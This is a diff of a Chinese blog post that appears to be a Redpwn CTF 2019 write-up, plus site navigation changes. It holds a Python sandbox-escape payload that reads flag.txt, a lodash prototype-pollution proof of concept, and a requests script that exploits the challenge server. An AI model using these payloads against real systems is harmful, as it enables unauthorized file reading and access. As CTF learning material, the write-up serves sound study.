+<p>给出的payload如下</p>
+<p><code>raw_input((42).__class__.__base__.__subclasses__()[40]('flag.txt').read())</code></p>
+<h2>web</h2>
+<h3>blueprint</h3>
+<p>题目给出了源码</p>
+<p>但是这对于不懂JavaScript的我来说又有什么用呢。</p>
+<p>天真的以为是XSS，于是抓包fuzz了一波，但是没有任何结果：</p>
+<p><img src="https://i.loli.net/2019/08/19/ObmNvATC9y2qPtD.png" alt="quicker_7022e4bc-93b6-4fb5-a45f-9f858318ed23.png"></p>
+<p>之后得知这是JavaScript原型污染，具体什么是JavaScript的原型污染之后再说</p>
+<p>可以参考<a href="https://snyk.io/vuln/SNYK-JS-LODASH-450202" target="_blank" rel="noopener">这篇</a>，lodash这个库存在原型链污染</p>
+<p>poc如下</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const mergeFn = require(<span class="string">'lodash'</span>).defaultsDeep;</span><br><span class="line">const payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"a0": true&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line">function check() &#123;</span><br><span class="line">    mergeFn(&#123;&#125;, JSON.parse(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[`a0`] === true) &#123;</span><br><span class="line">        console.log(`Vulnerable to Prototype Pollution via $&#123;payload&#125;`);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure></p>
+<p>原体中存在漏洞的代码；</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/blue1.png" alt=""></p>
+<p>exp
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">user_id = <span class="string">'22b0d010672600233e4ea68da64b1750'</span></span><br><span class="line">url = <span class="string">"http://39.106.125.244:8001/"</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url, cookies=&#123;<span class="string">"user_id"</span>:user_id&#125;, json=&#123;<span class="string">"content"</span>:<span class="string">"yakuhito was here"</span>,<span class="string">"public"</span>:true, <span class="string">"constructor"</span>: &#123;<span class="string">"prototype"</span>: &#123;<span class="string">"public"</span>: true&#125;&#125;&#125;)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p>
+<p>然后就可以看到flag了</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/blue0.png" alt=""></p>
+<p>关于JavaScript原型链污染的文章可以看<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">p牛的</a></p>
+<h3></h3>
+<h2>参考</h2>
+<p><a href="https://kuhi.to/2019/08/15/redpwn-ctf-2019-writeup/#web-2" target="_blank" rel="noopener">Redpwn CTF 2019 – Writeup</a></p>
 
       
     </div>
@@ -499,14 +521,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/hash/" rel="tag"># hash</a>
-          
-            <a href="/tags/De1ctf/" rel="tag"># De1ctf</a>
-          
-        </div>
-      
 
       
       
@@ -516,8 +530,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/04/noSQL-Injection/" rel="next" title="noSQL Injection">
-                <i class="fa fa-chevron-left"></i> noSQL Injection
+              <a href="/2019/08/19/MISC中的隐写/" rel="next" title="MISC中的隐写">
+                <i class="fa fa-chevron-left"></i> MISC中的隐写
               </a>
             
           </div>
@@ -526,8 +540,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/05/windows资源管理器神器/" rel="prev" title="windows资源管理器神器">
-                windows资源管理器神器 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/08/19/phpmyadmin远程文件包含漏洞/" rel="prev" title="phpmyadmin远程文件包含漏洞">
+                phpmyadmin远程文件包含漏洞 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -718,7 +732,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">SSRF me</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">1.1.</span> <span class="nav-text">he sed shi sed</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">genericpyjail</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">2.1.</span> <span class="nav-text">Tux Trivia Show</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">2.2.</span> <span class="nav-text">genericpyjail2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.1.</span> <span class="nav-text">blueprint</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.2.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
             
 
           </div>
